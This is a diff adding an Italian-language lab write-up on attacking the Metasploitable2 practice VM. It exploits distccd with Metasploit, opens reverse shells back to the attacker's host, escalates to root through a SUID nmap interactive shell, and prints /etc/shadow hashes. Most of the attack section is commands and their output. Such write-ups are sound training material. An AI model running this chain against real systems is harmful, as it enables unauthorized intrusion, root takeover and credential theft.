@@ -775,8 +775,398 @@ sudo -i
 
 ---
 
-## 19. Nota etica
+## Distccd Exploitation and SUID Nmap Privilege Escalation
 
-Questo laboratorio è stato svolto esclusivamente su Metasploitable2, una macchina virtuale volutamente vulnerabile, in ambiente locale e autorizzato.
+Durante la service enumeration è stato identificato il servizio `distccd` sulla porta 3632:
+
+```text
+3632/tcp open distccd distccd v1
+```
+
+Questo servizio è stato analizzato come possibile vettore di accesso tramite Metasploit.
+
+---
+
+## Ricerca del modulo Metasploit
+
+Avvio Metasploit:
+
+```bash
+msfconsole
+```
+
+Ricerca modulo:
+
+```text
+search distccd
+```
+
+Modulo trovato:
+
+```text
+exploit/unix/misc/distcc_exec
+```
+
+Selezione modulo:
+
+```text
+use exploit/unix/misc/distcc_exec
+```
+
+Controllo opzioni:
+
+```text
+show options
+```
+
+---
+
+## Primo tentativo con payload reverse_bash
+
+Metasploit ha selezionato inizialmente il payload:
+
+```text
+cmd/unix/reverse_bash
+```
+
+Configurazione:
+
+```text
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.101
+set LPORT 4445
+run
+```
+
+Errore ottenuto:
+
+```text
+bash: /dev/tcp/192.168.1.101/4445: No such file or directory
+Exploit completed, but no session was created.
+```
+
+Interpretazione:
+
+```text
+L’exploit è stato eseguito, ma il payload reverse_bash non ha creato una sessione.
+Il problema era legato all’uso di /dev/tcp sul target.
+```
+
+---
+
+## Correzione: cambio payload
+
+Sono stati visualizzati i payload disponibili:
+
+```text
+show payloads
+```
+
+Payload scelto:
+
+```text
+payload/cmd/unix/reverse_perl
+```
+
+Configurazione corretta:
+
+```text
+set payload payload/cmd/unix/reverse_perl
+set RHOSTS 192.168.1.100
+set LHOST 192.168.1.101
+set LPORT 4446
+run
+```
+
+Risultato:
+
+```text
+Command shell session 1 opened
+192.168.1.101:4446 -> 192.168.1.100:57883
+```
+
+Interpretazione:
+
+```text
+Exploit riuscito.
+Reverse shell ottenuta sul target.
+```
+
+---
+
+## Verifica della shell
+
+Comandi eseguiti nella shell:
+
+```bash
+whoami
+id
+hostname
+uname -a
+pwd
+```
+
+Risultati:
+
+```text
+whoami: daemon
+id: uid=1(daemon) gid=1(daemon) groups=1(daemon)
+hostname: metasploitable
+uname -a: Linux metasploitable 2.6.24-16-server i686 GNU/Linux
+pwd: /tmp
+```
+
+Interpretazione:
+
+```text
+L’exploit distccd ha fornito accesso come utente daemon.
+La shell non è root.
+È necessaria una fase di privilege escalation.
+```
+
+---
+
+## Post-Exploitation Enumeration
+
+Enumerazione utenti locali:
+
+```bash
+cat /etc/passwd
+```
+
+Utenti interessanti trovati:
+
+```text
+root
+msfadmin
+user
+service
+postgres
+mysql
+tomcat55
+www-data
+daemon
+```
+
+Enumerazione home directory:
+
+```bash
+ls -la /home
+ls -la /home/msfadmin
+ls -la /home/user
+ls -la /home/service
+```
+
+Risultati importanti:
+
+```text
+/home/msfadmin
+/home/user
+/home/service
+```
+
+Enumerazione web root:
+
+```bash
+ls -la /var/www
+```
+
+Risultati importanti:
+
+```text
+/var/www/dav
+/var/www/dvwa
+/var/www/mutillidae
+/var/www/phpMyAdmin
+/var/www/phpinfo.php
+/var/www/twiki
+```
+
+Controllo accesso a file root:
+
+```bash
+cat /root/.rhosts 2>&1
+cat /root/reset_logs.sh 2>&1
+```
+
+Risultato iniziale:
+
+```text
+Permission denied
+```
+
+Interpretazione:
+
+```text
+L’utente daemon non aveva ancora privilegi sufficienti per leggere file protetti in /root.
+```
+
+---
+
+## Ricerca file SUID
+
+Comando usato:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Risultato importante:
+
+```text
+/usr/bin/nmap
+```
+
+Interpretazione:
+
+```text
+Il binario /usr/bin/nmap ha il bit SUID attivo.
+Una versione vecchia di Nmap con modalità interattiva può essere usata per eseguire una shell con privilegi elevati.
+```
+
+---
+
+## Privilege Escalation con SUID Nmap
+
+Avvio modalità interattiva di Nmap:
+
+```bash
+/usr/bin/nmap --interactive
+```
+
+Prompt ottenuto:
+
+```text
+nmap>
+```
+
+Esecuzione shell dalla modalità interattiva:
+
+```bash
+!sh
+```
+
+Verifica privilegi:
+
+```bash
+whoami
+id
+hostname
+pwd
+```
+
+Risultati:
+
+```text
+whoami: root
+id: uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
+hostname: metasploitable
+pwd: /tmp
+```
+
+Interpretazione:
+
+```text
+uid=1(daemon) indica l’utente reale.
+euid=0(root) indica che il processo sta eseguendo con privilegi effettivi di root.
+La privilege escalation è riuscita.
+```
+
+---
+
+## Conferma accesso root
+
+Lettura di `/etc/shadow`:
+
+```bash
+cat /etc/shadow | head
+```
+
+Risultato:
+
+```text
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+```
+
+Interpretazione:
+
+```text
+/etc/shadow contiene hash delle password degli utenti Linux.
+La lettura di questo file conferma privilegi root o equivalenti.
+```
+
+Lettura di `/root/reset_logs.sh`:
+
+```bash
+cat /root/reset_logs.sh
+```
+
+Risultato:
+
+```text
+File letto correttamente.
+Prima della privilege escalation dava Permission denied.
+```
+
+Interpretazione:
+
+```text
+La lettura di file protetti in /root conferma il successo della privilege escalation.
+```
+
+---
+
+## Catena completa
+
+```text
+Nmap trova distccd su 3632
+↓
+Metasploit: exploit/unix/misc/distcc_exec
+↓
+Payload reverse_bash fallisce
+↓
+Cambio payload: reverse_perl
+↓
+Shell come daemon
+↓
+Post-exploitation enumeration
+↓
+find / -perm -4000 -type f 2>/dev/null
+↓
+Trovato /usr/bin/nmap SUID
+↓
+/usr/bin/nmap --interactive
+↓
+!sh
+↓
+euid=0(root)
+↓
+lettura /etc/shadow
+↓
+lettura /root/reset_logs.sh
+```
+
+---
+
+## Lezioni apprese
+
+```text
+Exploit riuscito non significa sempre root.
+Se la shell è utente basso, serve post-exploitation.
+La ricerca dei file SUID è fondamentale per privilege escalation Linux.
+Il parametro euid=0(root) indica privilegi effettivi root.
+Il payload corretto può fare la differenza tra exploit fallito e sessione funzionante.
+```
+
+---
+
+## Nota etica
+
+Questo test è stato svolto esclusivamente su Metasploitable2, macchina vulnerabile progettata per laboratori locali autorizzati.
 
 Non utilizzare questi comandi contro sistemi reali senza autorizzazione esplicita.
+
+
+
